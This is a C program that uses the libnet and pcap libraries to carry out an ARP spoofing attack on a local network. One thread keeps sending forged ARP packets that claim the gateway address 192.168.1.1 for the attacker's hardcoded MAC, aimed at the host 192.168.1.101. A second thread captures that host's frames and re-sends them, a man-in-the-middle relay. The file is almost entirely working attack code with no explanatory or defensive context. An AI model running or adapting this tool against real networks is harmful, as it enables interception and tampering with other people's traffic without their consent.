#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/select.h>
#include <libnet.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/errno.h>
#include <stdlib.h>
#include <pthread.h>

#define ETH	"enp0s25"

char 				pcap_buf[64];				// receive the message for error
unsigned char 		hw_addr[6] = {0x54, 0xee, 0x75, 0x39, 0xcb, 0x99};
unsigned char		hw_dsad[6] = {0xc0, 0x18, 0x85, 0x50, 0xec, 0xc3};

void * arp_cheat(void * args);
void * data_send(void *args);

void err_pcap(const char *msg)
{
	printf("%s : %s\n", msg, pcap_buf);
	exit(0);
}
void err_sys(const char *msg)
{
	printf("%s:%s\n" ,msg, strerror(errno)); 
	exit(0);
}

int main(int argc, char *argv)
{
	pthread_t arp_tid;
	pthread_t data_tid;

	if(pthread_create(&arp_tid, NULL, arp_cheat, NULL) == -1)
		err_sys("pthread_create error");
	if(pthread_create(&data_tid, NULL, data_send, NULL) == -1)
		err_sys("pthread_create error");

	if(pthread_detach(arp_tid) == -1)
		err_sys("pthread_detach error");
	if(pthread_detach(data_tid) == -1)
		err_sys("pthread_detach error");

	while(1)
		pause();

	return 0;
}
void * data_send(void *args)
{

	pcap_t 				*pcapfd;
	libnet_t 			* lib;	
	libnet_ptag_t		ptag;
	char	 			err_buf[50];
	char 				*dev_name = "enp0s25";		// Network device name
	char 				*cmd	= "";
	const unsigned char	*ptr, *data;
	struct in_addr		inter_addr, mask_addr;
	char		 	     src_addr[INET_ADDRSTRLEN], dst_addr[INET_ADDRSTRLEN];
	char				inter_addr_name[INET_ADDRSTRLEN];
	char				mask_addr_name[INET_ADDRSTRLEN];
	struct bpf_program	fcode;
	struct pcap_pkthdr	hdr;
	unsigned short 		mac_type ;
	unsigned short 		mac_op;

	if((lib = libnet_init(LIBNET_LINK, ETH, err_buf)) == NULL)
	{
		printf("libnet_init error : %s\n", err_buf);
		exit(0);
	}
	if((pcapfd = pcap_open_live(dev_name, 200, 0, 500, pcap_buf)) == NULL)
		err_pcap("pcap_open_live error");


	if(pcap_lookupnet(dev_name, (bpf_u_int32 *)&inter_addr, (bpf_u_int32 *)&mask_addr, pcap_buf) == -1)
		err_pcap("pcap_lookupnet error");
	printf("dev : %s\nip_addr:%s\nnetmask:%s\n", dev_name, 
						inet_ntop(AF_INET, &inter_addr, inter_addr_name, INET_ADDRSTRLEN),
						inet_ntop(AF_INET, &mask_addr, mask_addr_name, INET_ADDRSTRLEN));
	// compile
	if(pcap_compile(pcapfd, &fcode, cmd, 0, *(bpf_u_int32 *)&mask_addr) == -1)
		err_sys("pcap_compile error");
	if(pcap_setfilter(pcapfd, &fcode) == -1)
		err_sys("pcap_setfilter error");

	printf("Link = %d\n", pcap_datalink(pcapfd));

	
	while(1)
	{
		if((ptr = (unsigned char *)pcap_next(pcapfd, &hdr))!= NULL)
		{
			puts("+++");
			int i;
			for(i = 0; i < 6; i++)
			{
				if(hw_dsad[i] != ptr[6+i])
					break;
			}

			if(i != 6)
				continue;
			
			mac_type = ntohs(*(unsigned short *)(ptr+12));
			printf("Package : %d : %04x\n", hdr.caplen, mac_type);

			if(hdr.caplen > 120)
				continue;

			

			 ptag = libnet_build_ethernet((u_int8_t *)ptr, (u_int8_t *)&ptr[6],
			 								mac_type, ptr+14, 
			 								hdr.caplen-16, lib, 0);
			 if(libnet_write(lib) == -1)
			 	err_sys("libnet_write error");		
		}
	}
	return 0;
}

void * arp_cheat(void * args)
{
	libnet_t 			* lib;
	char	 			err_buf[50];
	libnet_ptag_t		ptag;
	struct in_addr		ip_src_addr, ip_dst_addr;
	unsigned char		hw_req[6]={0};
	unsigned char		pad[18] = {0};
	struct timeval		my_sleep;

	if((lib = libnet_init(LIBNET_LINK, ETH, err_buf)) == NULL)
	{
		printf("libnet_init error : %s\n", err_buf);
		exit(0);
	}

	if(inet_pton(AF_INET, "192.168.1.1", (void *)&ip_src_addr) == -1)
		err_sys("inet_pton error");
	if(inet_pton(AF_INET, "192.168.1.101", (void *)&ip_dst_addr) == -1)
		err_sys("inet_pton error");

	// Create a ARP packge
	ptag = libnet_build_arp(0x0001, 0x0800, 6, 4, 1, 
							(u_int8_t*) hw_addr, (u_int8_t *)&ip_src_addr,
							(u_int8_t*) hw_req, (u_int8_t *)&ip_dst_addr,
							pad,18, lib, 0);
	ptag = libnet_build_ethernet((u_int8_t *)hw_dsad, (u_int8_t *)hw_addr,
								0x0806, NULL, 0, lib, 0);
	
	

	while(1)
	{
		my_sleep.tv_sec = 0;
		my_sleep.tv_usec = 100000;
		select(1, NULL, NULL, NULL, &my_sleep);

		puts("SEND");
		if(libnet_write(lib) == -1)
			err_sys("libnet_write error");	
	}
	

	libnet_destroy(lib);

	return NULL;
}